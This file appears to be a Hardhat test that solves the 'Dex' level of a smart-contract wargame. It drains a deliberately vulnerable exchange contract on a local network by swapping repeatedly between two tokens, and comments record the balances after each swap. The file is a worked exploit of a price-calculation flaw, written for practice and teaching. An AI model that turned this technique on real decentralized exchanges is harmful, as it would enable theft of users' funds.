import { loadFixture } from "@nomicfoundation/hardhat-toolbox/network-helpers";
import { expect } from "chai";

import {
  Dex,
  DexFactory,
  DexFactory__factory,
  Dex__factory,
  SwappableToken,
  SwappableToken__factory,
} from "../typechain-types";
import { FixtureContext, FixtureLevel, deployEssentials, deployLevel } from "./fixtures";
import { completeLevel } from "./helpers";

describe("22. Dex", function () {
  let context: FixtureContext;
  let level: FixtureLevel<DexFactory, Dex>;

  beforeEach(async function () {
    context = await loadFixture(deployEssentials);
    level = await deployLevel(context, DexFactory__factory, (address, signer) => Dex__factory.connect(address, signer));
  });

  it("should be attacked successfully", async function () {
    const token1: SwappableToken = SwappableToken__factory.connect(await level.instance.token1(), context.player);
    const token2: SwappableToken = SwappableToken__factory.connect(await level.instance.token2(), context.player);

    const logBalances = async () => {
      console.log(
        `D1: ${(await token1.balanceOf(level.instance)).toString()}, D2: ${(await token2.balanceOf(level.instance)).toString()}`,
      );
      console.log(
        `U1: ${(await token1.balanceOf(context.player)).toString()}, U2: ${(await token2.balanceOf(context.player)).toString()}\n`,
      );
    };

    await (await level.instance.approve(level.instance, 5000)).wait();
    //await logBalances();
    //D1: 100, D2: 100
    //U1: 10, U2: 10

    await (await level.instance.swap(token1, token2, 10)).wait();
    //await logBalances();
    //D1: 110, D2: 90
    //U1: 0, U2: 20

    await (await level.instance.swap(token2, token1, 20)).wait();
    //await logBalances();
    //D1: 86, D2: 110
    //U1: 24, U2: 0

    await (await level.instance.swap(token1, token2, 24)).wait();
    //await logBalances();
    //D1: 110, D2: 80
    //U1: 0, U2: 30

    await (await level.instance.swap(token2, token1, 30)).wait();
    //await logBalances();
    //D1: 69, D2: 110
    //U1: 41, U2: 0

    await (await level.instance.swap(token1, token2, 41)).wait();
    //await logBalances();
    //D1: 110, D2: 45
    //U1: 0, U2: 65

    await (await level.instance.swap(token2, token1, 45)).wait();
    //await logBalances();
    //D1: 0, D2: 90
    //U1: 110, U2: 20

    await completeLevel(context, level);
  });
});
